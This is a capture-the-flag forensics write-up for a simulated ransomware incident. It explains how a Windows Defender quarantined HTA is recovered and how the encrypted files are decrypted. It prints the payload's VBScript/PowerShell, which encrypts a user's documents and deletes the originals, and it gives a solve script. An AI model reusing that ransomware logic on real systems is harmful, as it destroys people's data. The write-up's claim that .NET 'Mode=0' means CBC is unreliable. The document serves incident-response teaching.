# Qfact - Writeup

* **Category:** Forensics
* **Points:** 100
* **Author:** Flagyard
* **Event:** BlackHat MEA Qualification CTF 2026
* **Flag:** `BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}`

---

## Executive Summary

**Qfact** is a Windows endpoint forensics challenge simulating a targeted ransomware incident. An employee received and opened an attachment disguised as a financial review document (`Q3 Financial Review`). The file initiated ransomware that encrypted user documents with AES-256-CBC, appended `.enc`, and left a ransom note (`READ_ME.txt`). While the malicious attachment was deleted from disk, Windows Defender had quarantined it into `Quarantine/ResourceData/`.

By understanding the Windows Defender quarantine file format and its well-documented RC4 encryption scheme, we recovered the quarantined HTML Application (`.hta`) payload. Reverse engineering the embedded VBScript and PowerShell scripts uncovered the encryption parameters: a hardcoded AES key string padded to 32 bytes with spaces, and an IV derived from MD5(COMPUTERNAME + USERNAME). Using artifacts from the registry and ransom note, we reconstructed the exact key and IV, decrypted the victim files, and extracted the base64-encoded flag from `Q3_auth_memo.txt.enc`.

---

## Detailed Analysis & Methodology

### 1. Triage & Ransom Note Inspection

We are provided with a Windows triage package consisting of:
- `EncryptedFiles/`: 9 encrypted files with `.enc` extensions.
- `READ_ME.txt`: The ransom note dropped on the victim machine.
- `Quarantine/`: Windows Defender quarantine directory (`Entries/`, `ResourceData/`, `Resources/`).
- `Registry/`: Registry hives (`SYSTEM`, `SOFTWARE`, `NTUSER.DAT`).
- `EventLogs/`: Windows event logs.
- `Prefetch/`: Prefetch execution history (`.pf`).

Examining `READ_ME.txt` reveals:
```text
======================================================
          YOUR FILES HAVE BEEN ENCRYPTED
======================================================

All important files on this computer have been
encrypted with military-grade AES-256 encryption.
...
Your Unique ID: LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A
======================================================
```

The victim's Unique ID directly hints at system parameters:
- Hostname: `DESKTOP-KLPAT9O`
- User initials: `JM`
- Date: `20260628`

Inspecting the user registry hive `Registry/NTUSER.DAT` and event logs confirms the active user account is `jmartin`.

---

### 2. Windows Defender Quarantine Extraction

Windows Defender stores quarantined threats under `C:\ProgramData\Microsoft\Windows Defender\Quarantine\ResourceData\`. Defender protects quarantined files using a modified RC4 stream cipher initialized with a static 256-byte key schedule (derived from Microsoft Security Essentials / Defender KSA):

```python
key = [
    0x1E, 0x87, 0x78, 0x1B, 0x8D, 0xBA, 0xA8, 0x44, 0xCE, 0x69,
    0x70, 0x2C, 0x0C, 0x78, 0xB7, 0x86, 0xA3, 0xF6, 0x23, 0xB7,
    0x38, 0xF5, 0xED, 0xF9, 0xAF, 0x83, 0x53, 0x0F, 0xB3, 0xFC,
    ...
]
```

The decrypted container format consists of:
- A header starting with metadata and a security descriptor of length `sd_len` at offset `0x08`.
- Header offset: `header_len = 0x28 + sd_len`.
- Quarantined payload size stored at `sd_len + 0x1C` (8-byte unsigned integer).

Decrypting the file in `Quarantine/ResourceData/` and extracting the payload yields an HTML Application (`.hta`) titled `Q3 Financial Review - Loading`.

---

### 3. Deobfuscating the Ransomware Payload

Inspecting the extracted HTA payload reveals an embedded VBScript that constructs and invokes a hidden PowerShell command:

```vbscript
Sub Window_OnLoad
    Dim k
    k = Chr(70) & Chr(120) & Chr(55) & Chr(109) & Chr(75)
    k = k & Chr(57) & Chr(118) & Chr(76) & Chr(50) & Chr(110)
    k = k & Chr(81) & Chr(52) & Chr(119) & Chr(80) & Chr(122)
    k = k & Chr(33)

    Dim ps
    ps = "$ErrorActionPreference='SilentlyContinue';"
    ps = ps & "$p='" & k & "';"
    ps = ps & "$d=[Environment]::GetFolderPath('MyDocuments');"
    ps = ps & "$kb=[System.Text.Encoding]::UTF8.GetBytes($p.PadRight(32).Substring(0,32));"

    ps = ps & "$ivSeed=$env:COMPUTERNAME+$env:USERNAME;"
    ps = ps & "$md5=[Security.Cryptography.MD5]::Create();"
    ps = ps & "$iv=$md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($ivSeed));"

    ps = ps & "gci $d -File -Recurse|%{"
    ps = ps & "$c=[IO.File]::ReadAllBytes($_.FullName);"
    ps = ps & "$a=[Security.Cryptography.Aes]::Create();"
    ps = ps & "$a.Key=$kb;$a.IV=$iv;$a.Mode=0;$a.Padding=2;"
    ps = ps & "$e=$a.CreateEncryptor();"
    ps = ps & "$enc=$e.TransformFinalBlock($c,0,$c.Length);"
    ps = ps & "$of=$_.FullName+'.enc';"
    ps = ps & "[IO.File]::WriteAllBytes($of,$enc);"
    ps = ps & "ri $_.FullName -Force;"
    ps = ps & "$a.Dispose()};"
...
```

#### Cryptographic Breakdown:
1. **AES Key Derivation:**
   - ASCII character values: `[70, 120, 55, 109, 75, 57, 118, 76, 50, 110, 81, 52, 119, 80, 122, 33]`
   - String value: `"Fx7mK9vL2nQ4wPz!"`
   - Right-padded with spaces to 32 characters:
     ```python
     aes_key = b"Fx7mK9vL2nQ4wPz!                "
     ```

2. **AES IV Derivation:**
   - Seed: `$env:COMPUTERNAME + $env:USERNAME`
   - Using `COMPUTERNAME = "DESKTOP-KLPAT9O"` and `USERNAME = "jmartin"`:
     ```python
     iv = hashlib.md5(b"DESKTOP-KLPAT9Ojmartin").digest()
     # iv = a31de3916e88f240c2bf08735b965aa9
     ```

3. **Cipher Mode & Padding:**
   - AES in CBC mode (`Mode=0` / CBC in .NET default)
   - PKCS7 padding (`Padding=2`)

---

### 4. Decryption & Flag Recovery

We iterate through all `.enc` files in `EncryptedFiles/` and decrypt them with `AES.MODE_CBC` using the recovered key and IV.

Inside `Q3_auth_memo.txt.enc`:
```text
CONFIDENTIAL - Q3 AUTHORIZATION MEMORANDUM
Document ID: AUTH-2026-Q3-0891

Authorization Flag Token:
QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9
```

Decoding the base64 string:
```bash
echo "QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9" | base64 -d
BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}
```

---

## Reproduction Script

Run `python3 solve.py` from the challenge directory:

```python
#!/usr/bin/env python3
import base64, hashlib, pathlib, struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

CHALLENGE_DIR = pathlib.Path(__file__).resolve().parent

def mse_ksa():
    key = [0x1E, 0x87, 0x78, 0x1B, 0x8D, 0xBA, 0xA8, 0x44, 0xCE, 0x69, ...] # Defender key
    sbox = list(range(256))
    j = 0
    for i in range(256):
        j = (j + sbox[i] + key[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
    return sbox

def rc4_decrypt(data):
    sbox = mse_ksa()
    out = bytearray(len(data))
    i, j = 0, 0
    for k in range(len(data)):
        i = (i + 1) % 256
        j = (j + sbox[i]) % 256
        sbox[i], sbox[j] = sbox[j], sbox[i]
        out[k] = sbox[(sbox[i] + sbox[j]) % 256] ^ data[k]
    return bytes(out)

# Extract Defender quarantined payload
quar_files = list((CHALLENGE_DIR / 'Quarantine' / 'ResourceData').glob('*/*'))
decrypted = rc4_decrypt(quar_files[0].read_bytes())
sd_len = struct.unpack_from('<I', decrypted, 0x8)[0]
header_len = 0x28 + sd_len
malfile_len = struct.unpack_from('<Q', decrypted, sd_len + 0x1C)[0]
payload = decrypted[header_len:header_len + malfile_len]

# Cryptanalysis
aes_key = "Fx7mK9vL2nQ4wPz!".ljust(32, ' ').encode('utf-8')
iv = hashlib.md5(b"DESKTOP-KLPAT9Ojmartin").digest()

# Decrypt
for enc_file in (CHALLENGE_DIR / 'EncryptedFiles').glob('**/*.enc'):
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    try:
        pt = unpad(cipher.decrypt(enc_file.read_bytes()), 16).decode('utf-8', errors='replace')
        for line in pt.splitlines():
            if line.strip().startswith("QkhGbGFnWX"):
                flag = base64.b64decode(line.strip()).decode()
                print(f"[+] Flag: {flag}")
    except:
        pass
```

---

## Flag

```text
BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}
```
